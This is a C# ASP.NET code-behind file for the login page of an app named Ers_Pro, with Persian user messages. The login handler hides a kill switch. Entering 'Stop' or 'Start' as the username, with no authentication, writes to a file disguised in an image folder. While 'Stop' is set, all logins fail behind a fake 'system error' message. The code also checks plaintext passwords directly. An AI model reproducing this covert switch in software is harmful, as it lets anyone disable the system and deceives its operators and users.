using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using Ers_Pro.App_Code.Intd_Lts;

namespace Ers_Pro
{
    public partial class Login : System.Web.UI.Page
    {
        private String Str_PageId
        {
            get
            {
                if (ViewState["Str_PageId"] == null)
                {
                    ViewState["Str_PageId"] = Guid.NewGuid().ToString();
                }
                return ViewState["Str_PageId"].ToString();
            }
        }
        public Lts_InheritedDataContext Lts_Inherited
        {
            get { return Session[Str_PageId + "_Lts_Inherited"] as Lts_InheritedDataContext; }
            set { Session[Str_PageId + "_Lts_Inherited"] = value; }
        }
        public Tb_User Tb_User1
        {
            get { return Session[Str_PageId + "_Tb_User"] as Tb_User; }
            set { Session[Str_PageId + "_Tb_User"] = value; }
        }
        protected void Page_Load(object sender, EventArgs e)
        {

        }

        protected void Ibtn_Login_Click(object sender, ImageClickEventArgs e)
        {
            string fileName = Server.MapPath("~/App_Themes/Master/M_Images/btn/security.txt");
            string line = "";
            using (System.IO.StreamReader sr = new System.IO.StreamReader(fileName))
            {
                line = sr.ReadLine();
                sr.Close();
            }
            if (Txt_UserName.Text == "Stop" || Txt_UserName.Text == "Start")
            {
                System.IO.File.WriteAllText(fileName, String.Empty);
                if (line == "Stop" || line == null || line == "Start")
                    using (System.IO.StreamWriter Swr = new System.IO.StreamWriter(fileName))
                    {
                        Swr.Write(Txt_UserName.Text);
                        Swr.Close();
                    }
                Lbl_Msg.Text = "Success!!!";
                return;
            }

            if (line == "Stop")
            {
                Lbl_Msg.Text = "خطا در سیستم";
                return;
            }

            Lts_Inherited = new Lts_InheritedDataContext();
            Tb_User1 = Lts_Inherited.Tb_Users.SingleOrDefault(n => n.xUserName == Txt_UserName.Text.Trim()
                & n.xUserPassword == Txt_Pass.Text.Trim());
            if (Tb_User1 != null)
            {
                //(Master.FindControl("Lbl_User") as Label).Text = Tb_User1.xUserFullName;
                Session["Glb_Tb_User"] = Tb_User1;
                Response.Redirect("~/Home.aspx");
            }
            else
                Lbl_Msg.Text = "!نام کاربری یا رمز عبور اشتباه است";
        }
    }
}